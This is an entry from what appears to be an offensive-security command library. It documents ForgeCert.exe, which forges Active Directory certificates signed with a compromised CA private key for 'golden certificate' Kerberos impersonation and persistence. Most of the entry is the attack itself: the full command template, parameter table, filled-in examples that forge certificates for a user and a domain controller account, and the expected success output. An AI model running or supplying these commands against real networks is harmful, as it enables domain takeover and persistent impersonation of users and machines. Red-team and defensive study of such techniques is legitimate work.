---
id: 00efff12-f62f-48f8-be80-1c001b8f0291
name: forgecert-forge-ad-certificate
type: command
executor: cmd
data: >-
  ForgeCert.exe --CaCertPath $_CA_CERT_PATH --CaCertPassword $_CA_PASSWORD
  --Subject CN=$__SUBJECT --SubjectAltName $_SUBJECT_ALT_NAME --NewCertPath
  $_NEW_CERT_PATH --NewCertPassword $_NEW_CERT_PASSWORD
output: null
created_at: '2023-04-06T03:56:28.398428+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - certificate-forgery
  - ad-persistence
verified: true
validated: true
---

# forgecert-forge-ad-certificate

## Command

```cmd
ForgeCert.exe --CaCertPath $_CA_CERT_PATH --CaCertPassword $_CA_PASSWORD --Subject CN=$__SUBJECT --SubjectAltName $_SUBJECT_ALT_NAME --NewCertPath $_NEW_CERT_PATH --NewCertPassword $_NEW_CERT_PASSWORD
```

## Description

Forges a new X.509 certificate signed by a compromised CA private key, targeting AD user or computer accounts via SubjectAltName (UPN or SPN). Use for golden certificate attacks to enable Kerberos impersonation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--CaCertPath` ($_CA_CERT_PATH) | Path to input CA .pfx file | Yes |
| `--CaCertPassword` ($_CA_PASSWORD) | Password for CA .pfx | Yes |
| `--Subject` (CN=$__SUBJECT) | Common Name for cert (e.g., CN=User) | Yes |
| `--SubjectAltName` ($_SUBJECT_ALT_NAME) | AD identifier (e.g., user@domain.local or DC$@domain.local) | Yes |
| `--NewCertPath` ($_NEW_CERT_PATH) | Output path for new .pfx | Yes |
| `--NewCertPassword` ($_NEW_CERT_PASSWORD) | Password for new .pfx | Yes |

## Examples

### Basic Usage (User Cert)

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123
```

### Advanced Usage (Computer Cert)

```cmd
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=DC --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123
```

## Expected Output

Console success message:

```
[*] Action: CreateCertificate
[*] CA Cert Path: ca.pfx
[*] New Cert Path: harry.pfx
[+] Certificate created successfully!
[*] Thumbprint: A1B2C3D4...
```

New .pfx file is generated and importable into cert stores.

## Related

- [[procedures/Golden-Certificate-Domain-Persistence]]
- [[tools/ForgeCert]]
